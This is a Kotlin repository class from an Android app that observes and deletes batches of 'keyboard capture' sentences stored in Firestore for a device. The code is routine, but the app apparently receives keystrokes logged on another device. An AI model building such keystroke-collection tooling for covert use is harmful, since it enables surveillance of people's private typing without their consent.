// ============================================================
// FILE: app/src/main/java/com/app/notisync_receiver/data/repository/KeyboardRepository.kt
// Purpose: Reads keyboard capture data from Firestore
// ============================================================

package com.app.notisync_receiver.data.repository

import com.app.notisync_receiver.data.remote.FirestoreDataSource
import com.app.notisync_receiver.domain.model.SentenceBatch
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.emptyFlow
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class KeyboardRepository @Inject constructor(
    private val firestoreDataSource: FirestoreDataSource,
    private val authRepository: AuthRepository
) {

    fun observeKeyboardSentences(deviceId: String): Flow<List<SentenceBatch>> {
        val userId = authRepository.getCurrentUserId() ?: return emptyFlow()
        return firestoreDataSource.observeSentenceBatches(userId, deviceId)
    }

    suspend fun deleteSentenceBatch(deviceId: String, batchId: String): Result<Unit> {
        val userId = authRepository.getCurrentUserId()
            ?: return Result.failure(Exception("User not logged in"))
        return firestoreDataSource.deleteSentenceBatch(userId, deviceId, batchId)
    }
}
